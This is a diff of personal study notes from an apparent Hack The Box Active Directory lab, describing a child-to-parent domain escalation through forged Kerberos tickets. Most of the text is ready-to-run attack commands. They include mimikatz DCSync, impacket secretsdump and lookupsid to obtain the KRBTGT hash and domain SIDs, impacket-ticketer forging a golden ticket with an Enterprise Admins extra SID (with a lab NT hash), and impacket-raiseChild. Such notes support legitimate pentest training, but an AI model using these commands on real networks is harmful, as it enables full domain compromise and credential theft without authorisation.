@@ -32,11 +32,16 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOC
 ```
 Linux:  
 Requires  
-* The KRBTGT hash for the child domain(impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt)
-* The SID for the child domain(impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240)
+* The KRBTGT hash for the child domain(impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240-dc of child domain -just-dc-user LOGISTICS/krbtgt)
+* The SID for the child domain(impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240-dc of child domain)
 * The name of a target user in the child domain (does not need to exist!)
 * The FQDN of the child domain.
-* The SID of the Enterprise Admins group of the root domain.
+* The SID of the Enterprise Admins group of the root domain.(impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5(dc of parent domain))
+Manual way:
+```
+impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f(KRBTGT hash for the child domain) -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689(child domain) -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519(SID of the Enterprise Admins group of the parent domain) hacker
+```
+automatic way:  
 ```
 impacket-raiseChild -target-exec 172.16.5.5(dc ip of Parent Domain) LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm(an administrative user in the child domain)
 ```
